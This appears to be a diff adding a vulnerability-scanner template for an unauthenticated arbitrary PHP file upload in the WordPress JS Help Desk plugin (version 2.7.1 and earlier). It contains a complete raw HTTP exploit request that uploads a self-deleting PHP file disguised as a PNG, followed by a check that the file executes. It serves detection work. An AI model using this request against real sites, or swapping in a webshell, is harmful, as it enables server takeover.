@@ -1,0 +1,52 @@
+id: wordpress-plugin-js-support-ticket-file-upload
+info:
+  name: WordPress Plugin js-support-ticket File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    JS Help Desk <= 2.7.1 Unauthenticated Arbitrary File Upload. An attacker can use the uploaded malicious script file to control the whole website or even control the server. This malicious script file, also known as WebShell, can also be referred to as a kind of web backdoor.
+  tags: file-upload, wordpress
+  reference:
+    - https://patchstack.com/database/vulnerability/js-support-ticket/wordpress-js-help-desk-plugin-2-7-1-arbitrary-file-upload-vulnerability
+
+variables:
+  random_filename: "{{rand_base(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /wp-admin/?page=configuration&task=saveconfiguration HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------767099171
+
+        ----------767099171
+        Content-Disposition: form-data; name="action"
+
+        configuration_saveconfiguration
+        ----------767099171
+        Content-Disposition: form-data; name="form_request"
+
+        jssupportticket
+        ----------767099171
+        Content-Disposition: form-data; name="support_custom_img"; filename="{{random_filename}}.php"
+        Content-Type: image/png
+
+        <?php echo md5(123456789); unlink(__FILE__); ?>
+        ----------767099171--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /wp-content/plugins/js-support-ticket/jssupportticketdata/supportImg/{{random_filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "25f9e794323b453885f5181f1b624d0b"
